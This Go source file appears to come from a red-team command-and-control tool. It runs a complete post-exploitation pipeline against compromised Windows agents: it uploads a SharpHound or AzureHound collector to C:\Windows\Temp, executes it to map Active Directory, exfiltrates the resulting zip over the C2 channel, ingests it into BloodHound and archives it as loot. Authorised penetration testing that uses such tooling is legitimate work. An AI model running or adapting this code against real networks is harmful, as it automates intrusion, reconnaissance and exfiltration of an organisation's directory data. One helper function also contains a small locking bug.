package bloodhound

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// CollectionOptions drives one SharpHound/AzureHound collection run.
type CollectionOptions struct {
	Collector      string   `json:"collector"`      // "sharphound" | "azurehound"
	Methods        []string `json:"methods"`        // e.g. ["Default"], ["All"]
	Flags          []string `json:"flags"`          // extra collector flags (--Loop stripped)
	Domain         string   `json:"domain"`         // optional --domain target
	TimeoutSeconds int      `json:"timeoutSeconds"` // default 900 (15m), clamped 60..3600
	Ingest         bool     `json:"ingest"`         // default true
	Loot           bool     `json:"loot"`           // default true
}

// Stage is a collection pipeline phase, published to the frontend via
// bloodhound.collection.<id>.<stage> events.
type Stage string

const (
	StageStaged      Stage = "staged"
	StageRunning     Stage = "running"     // downloading + staging the collector on the agent
	StageCollecting  Stage = "collecting"  // collector executing
	StageDownloading Stage = "downloading" // artifact exfil via C2
	StageIngesting   Stage = "ingesting"   // upload to BloodHound
	StageDone        Stage = "done"
	StageFailed      Stage = "failed"
)

// CollectionState is the wire shape for one run.
type CollectionState struct {
	ID             string `json:"id"`
	AgentID        string `json:"agentId"`
	Collector      string `json:"collector"`
	Stage          Stage  `json:"stage"`
	Progress       string `json:"progress,omitempty"`
	Err            string `json:"error,omitempty"`
	RemoteArtifact string `json:"remoteArtifact,omitempty"`
	IngestJobID    int64  `json:"ingestJobId,omitempty"`
	StartedAt      int64  `json:"startedAt"`
}

// CollectorSource fetches collector binaries (the Service implements this
// via the BloodHound collector manifest).
type CollectorSource interface {
	Download(ctx context.Context, collector, tag string) (string, string, error)
}

// CommandRunner executes a command on an agent and returns its output.
type CommandRunner interface {
	Run(ctx context.Context, agentID, command string) (string, error)
}

// ArtifactFetcher moves files between the operator machine and an agent
// without dialogs (backed by internal/sliver/files in production).
type ArtifactFetcher interface {
	Upload(ctx context.Context, agentID, remotePath, localPath string) error
	Download(ctx context.Context, agentID, remotePath, localPath string) error
}

// LootArchiver archives collected artifacts (backed by internal/sliver/loot).
type LootArchiver interface {
	Archive(ctx context.Context, name string, data []byte) error
}

var validMethods = map[string]bool{
	"All": true, "Default": true, "Session": true, "LoggedOn": true,
	"Group": true, "CertServices": true, "LocalAdmin": true,
	"RDP": true, "DCOM": true, "PSRemote": true, "Trusts": true,
	"Container": true, "DcOnly": true, "ObjectProps": true, "ACL": true,
	"SessionLoop": true, "GPOLocalGroup": true, "ComputerOnly": true,
}

func sanitizeMethods(methods []string) []string {
	out := make([]string, 0, len(methods))
	seen := map[string]bool{}
	for _, m := range methods {
		m = strings.TrimSpace(m)
		if m == "" || seen[m] {
			continue
		}
		if !validMethods[m] {
			continue // unknown methods dropped silently; command never breaks
		}
		seen[m] = true
		out = append(out, m)
	}
	if len(out) == 0 {
		return []string{"Default"}
	}
	return out
}

func sanitizeFlags(flags []string) ([]string, string) {
	out := make([]string, 0, len(flags))
	var dropped []string
	for _, f := range flags {
		f = strings.TrimSpace(f)
		if f == "" {
			continue
		}
		if f == "--Loop" {
			dropped = append(dropped, "--Loop")
			continue
		}
		out = append(out, f)
	}
	if len(dropped) > 0 {
		return out, fmt.Sprintf("dropped flags: %s", strings.Join(dropped, ", "))
	}
	return out, ""
}

func clampTimeoutSeconds(seconds int) time.Duration {
	if seconds <= 0 {
		return 15 * time.Minute
	}
	d := time.Duration(seconds) * time.Second
	if d < time.Minute {
		return time.Minute
	}
	if d > time.Hour {
		return time.Hour
	}
	return d
}

// CollectionRunner orchestrates collect→download→ingest→loot runs. All
// agent-facing work goes through the injected interfaces, so the runner
// stays testable without a teamserver.
type CollectionRunner struct {
	svc    *Service
	source CollectorSource
	run    CommandRunner
	files  ArtifactFetcher
	loot   LootArchiver

	mu     sync.Mutex
	states map[string]*CollectionState
}

func NewCollectionRunner(svc *Service, source CollectorSource, run CommandRunner, files ArtifactFetcher, loot LootArchiver) *CollectionRunner {
	return &CollectionRunner{
		svc:    svc,
		source: source,
		run:    run,
		files:  files,
		loot:   loot,
		states: map[string]*CollectionState{},
	}
}

func (r *CollectionRunner) setState(id string, stage Stage, progress, errStr string) {
	r.mu.Lock()
	st := r.states[id]
	if st == nil {
		return
	}
	st.Stage = stage
	st.Progress = progress
	st.Err = errStr
	payload := *st
	r.mu.Unlock()
	r.svc.publish("bloodhound.collection."+id+"."+string(stage), payload)
}

// Start validates the request and launches the pipeline asynchronously.
// Returns the run ID. v2 restricts collection to Windows sessions.
func (r *CollectionRunner) Start(ctx context.Context, agentID, agentKind, agentOS string, opts CollectionOptions) (string, error) {
	if _, err := r.svc.snapshot(); err != nil {
		return "", err
	}
	if agentKind != "session" {
		return "", fmt.Errorf("bloodhound: collection requires an interactive session (got %s)", agentKind)
	}
	if !strings.EqualFold(agentOS, "windows") {
		return "", fmt.Errorf("bloodhound: collection requires a Windows agent (got %s)", agentOS)
	}
	if _, ok := collectorTypes[strings.ToLower(strings.TrimSpace(opts.Collector))]; !ok {
		return "", fmt.Errorf("%w: %q", errInvalidCollector, opts.Collector)
	}

	id := newCollectionID()
	methods := sanitizeMethods(opts.Methods)
	flags, dropped := sanitizeFlags(opts.Flags)
	opts.Methods = methods
	opts.Flags = flags

	r.mu.Lock()
	r.states[id] = &CollectionState{
		ID:        id,
		AgentID:   agentID,
		Collector: strings.ToLower(strings.TrimSpace(opts.Collector)),
		Stage:     StageStaged,
		Progress:  dropped,
		StartedAt: time.Now().UnixMilli(),
	}
	r.mu.Unlock()
	r.svc.publish("bloodhound.collection."+id+".staged", *r.states[id])

	go r.pipeline(id, agentID, opts)
	return id, nil
}

func (r *CollectionRunner) pipeline(id, agentID string, opts CollectionOptions) {
	ctx, cancel := context.WithTimeout(context.Background(), clampTimeoutSeconds(opts.TimeoutSeconds))
	defer cancel()

	fail := func(stage Stage, format string, args ...any) {
		r.setState(id, StageFailed, "", fmt.Sprintf(format, args...))
	}

	collector := strings.ToLower(opts.Collector)
	remoteDir := `C:\Windows\Temp`

	// Running: fetch the collector binary and stage it on the agent.
	r.setState(id, StageRunning, "downloading collector", "")
	localCollector, _, err := r.source.Download(ctx, collector, "")
	if err != nil {
		fail(StageRunning, "collector download failed: %v", err)
		return
	}
	remoteCollector := filepath.Join(remoteDir, collectorFileName(collector))
	r.setState(id, StageRunning, "uploading collector", "")
	if err := r.files.Upload(ctx, agentID, remoteDir, localCollector); err != nil {
		fail(StageRunning, "collector upload failed: %v", err)
		return
	}

	// Collecting: run the collector.
	artifactName := fmt.Sprintf("siren-%s-%s.zip", collector, id)
	remoteArtifact := filepath.Join(remoteDir, artifactName)
	cmd := fmt.Sprintf(`"%s" -c %s --zipfilename %s`, remoteCollector, strings.Join(opts.Methods, ","), artifactName)
	if opts.Domain != "" {
		cmd += " --domain " + opts.Domain
	}
	if len(opts.Flags) > 0 {
		cmd += " " + strings.Join(opts.Flags, " ")
	}
	r.setState(id, StageCollecting, "collector running", "")
	if _, err := r.run.Run(ctx, agentID, cmd); err != nil {
		fail(StageCollecting, "collector failed: %v", err)
		return
	}
	time.Sleep(time.Second) // settle for zip finalization

	// Downloading: exfil the artifact.
	localArtifact := filepath.Join(r.svc.dataDir, "collections", id, artifactName)
	if err := os.MkdirAll(filepath.Dir(localArtifact), 0o755); err != nil {
		fail(StageDownloading, "mkdir: %v", err)
		return
	}
	r.setState(id, StageDownloading, "exfil via C2", "")
	if err := r.files.Download(ctx, agentID, remoteArtifact, localArtifact); err != nil {
		fail(StageDownloading, "artifact download failed: %v", err)
		return
	}
	data, err := os.ReadFile(localArtifact)
	if err != nil {
		fail(StageDownloading, "read artifact: %v", err)
		return
	}
	r.mu.Lock()
	r.states[id].RemoteArtifact = localArtifact
	r.mu.Unlock()

	// Ingesting: push to BloodHound, then archive to loot.
	if opts.Ingest {
		r.setState(id, StageIngesting, "uploading to BloodHound", "")
		job, err := r.svc.IngestBytes(ctx, artifactName, "application/zip", data)
		if err != nil {
			fail(StageIngesting, "ingest failed: %v", err)
			return
		}
		r.mu.Lock()
		r.states[id].IngestJobID = job.ID
		r.mu.Unlock()
	}
	if opts.Loot {
		name := fmt.Sprintf("bloodhound-%s-%d", agentID, time.Now().UnixMilli())
		if err := r.loot.Archive(ctx, name, data); err != nil {
			fail(StageDone, "loot archive failed: %v", err)
			return
		}
	}
	r.setState(id, StageDone, "", "")
}

// Status returns the current state of a run.
func (r *CollectionRunner) Status(id string) (CollectionState, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	st, ok := r.states[id]
	if !ok {
		return CollectionState{}, false
	}
	return *st, true
}

// List returns every run, most recent first.
func (r *CollectionRunner) List() []CollectionState {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make([]CollectionState, 0, len(r.states))
	for _, st := range r.states {
		out = append(out, *st)
	}
	for i := len(out)/2 - 1; i >= 0; i-- {
		opp := len(out) - 1 - i
		out[i], out[opp] = out[opp], out[i]
	}
	return out
}

func newCollectionID() string {
	buf := make([]byte, 6)
	if _, err := rand.Read(buf); err != nil {
		return fmt.Sprintf("%d", time.Now().UnixNano())
	}
	return hex.EncodeToString(buf)
}
